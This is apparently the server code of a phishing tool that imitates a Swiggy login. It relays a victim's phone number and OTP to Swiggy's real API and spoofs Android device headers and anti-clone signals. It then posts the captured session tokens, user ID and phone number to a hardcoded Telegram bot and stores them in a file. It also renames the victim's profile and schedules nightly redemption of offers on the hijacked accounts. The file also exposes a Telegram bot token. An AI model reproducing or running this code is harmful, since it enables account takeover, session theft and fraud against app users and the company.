const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const cron = require('node-cron');
const { claimOffers, updateProfileName } = require('./claimer');

const app = express();
app.use(express.json());

app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');
    if (req.method === 'OPTIONS') return res.sendStatus(204);
    next();
});

const TELEGRAM_BOT_TOKEN = "8642907155:AAHULXBX2ENPPrE7ZYDJwezQorQu0z0yc-o";
const TELEGRAM_CHAT_ID = "8450000919";
const SESSIONS_FILE = path.join(__dirname, 'sessions.json');

if (!fs.existsSync(SESSIONS_FILE)) fs.writeFileSync(SESSIONS_FILE, '[]');

// Schedule Night Claimer (11:30 PM IST)
cron.schedule('30 23 * * *', () => {
    console.log('[⏰] Scheduled Night Claimer running...');
    claimOffers();
}, { timezone: "Asia/Kolkata" });

async function sendToTelegram(sessionData) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const message = `*NEW SWIGGY SESSION*\n\n📱 *Mobile:* \`${sessionData.mobile}\`\n *User ID:* \`${sessionData.userid}\`\n⏰ *Generated:* ${new Date().toLocaleString()}\n\n📄 *Session Data:*\n\`\`\`json\n${JSON.stringify(sessionData, null, 2)}\n\`\`\``;
    const payload = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };

    try {
        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
        console.log(`[+] Session sent to Telegram for ${sessionData.mobile}`);
    } catch (err) { console.error(`[-] Telegram send failed: ${err.message}`); }

    // Save to file & Set Random Name
    try {
        let sessions = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8'));
        sessionData.claimed = false;
        sessionData.nameSet = false;
        sessions.push(sessionData);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
        
        const newName = await updateProfileName(sessionData);
        if (newName) {
            sessionData.name = newName;
            sessionData.nameSet = true;
            const updatedSessions = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8'));
            const idx = updatedSessions.findIndex(s => s.mobile === sessionData.mobile && !s.nameSet);
            if (idx !== -1) {
                updatedSessions[idx].name = newName;
                updatedSessions[idx].nameSet = true;
                fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedSessions, null, 2));
            }
        }
    } catch (err) { console.error('[-] Failed to save session:', err.message); }
}

const DEVICES = [
    { vendor: "GOOGLE", hardware: "Pixel 8", ver: "1940", sw: "4.140.0" },
    { vendor: "SAMSUNG", hardware: "SM-S921B", ver: "1942", sw: "4.140.1" }
];

function genHex(len) { return crypto.randomBytes(len).toString('hex'); }

function buildHeaders(deviceId) {
    const d = DEVICES[Math.floor(Math.random() * DEVICES.length)];
    const uid = deviceId || genHex(8);
    return {
        "user-agent": "Swiggy-Android", "content-type": "application/json; charset=utf-8",
        "accept": "application/json; charset=utf-8", "version-code": d.ver, "app-version": d.sw,
        "manufacturer": d.vendor, "model-name": d.hardware, "swuid": uid, "deviceid": uid
    };
}

app.get('/api/otp', async (req, res) => {
    const phone = req.query.mobile;
    if (!phone || !/^\d{10}$/.test(phone)) return res.json({ statusCode: -1, statusMessage: "Invalid phone" });

    const devId = genHex(8);
    const headers = buildHeaders(devId);

    try {
        const resp = await fetch(`https://profile.swiggy.com/api/v3/app/sms_otp?mobile=${phone}`, { method: 'GET', headers });
        const data = await resp.json();
        data._devId = devId;
        res.json(data);
    } catch (err) { res.json({ statusCode: -1, statusMessage: err.message }); }
});

app.post('/api/verify', async (req, res) => {
    const { otp, tid, sid, deviceId, phone } = req.body;
    const headers = buildHeaders(deviceId);
    if (tid) headers["tid"] = tid;
    if (sid) headers["sid"] = String(sid);

    const payload = {
        cloningSignalsData: { appFilesDirPathInvalid: 0, developerModeEnabled: 1, deviceModelVmos: 0, emulatorStatus: 0, packageName: "in.swiggy.android", workProfileEnabled: 0 },
        otp: otp
    };

    try {
        const resp = await fetch('https://profile.swiggy.com/api/v3/app/login/verify?otp_source=Sms-manual', { method: 'POST', headers, body: JSON.stringify(payload) });
        const data = await resp.json();
        
        if (data.statusCode === 0) {
            const sess = {};
            const inner = typeof data.data === "object" ? data.data : {};
            ["token", "tid", "sid"].forEach(k => { if (inner[k]) sess[k] = inner[k]; else if (data[k]) sess[k] = data[k]; });
            sess.deviceId = String(data.deviceId || deviceId);
            
            try {
                const jwtPayload = sess.tid ? Buffer.from(sess.tid.split('.')[1], 'base64').toString() : '{}';
                const uid = JSON.parse(jwtPayload).user_id;
                if (uid) {
                    sess.userid = String(uid);
                    sess.mobile = phone || 'unknown';
                    if (!sess.customerId) sess.customerId = sess.userid;
                    sendToTelegram(sess).catch(console.error);
                }
            } catch (e) { console.error('JWT decode failed:', e); }
        }
        res.json(data);
    } catch (err) { res.json({ statusCode: -1, statusMessage: err.message }); }
});

app.get('/', (req, res) => { res.sendFile(__dirname + '/index.html'); });

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => { console.log(`Server running on port ${PORT}`); });
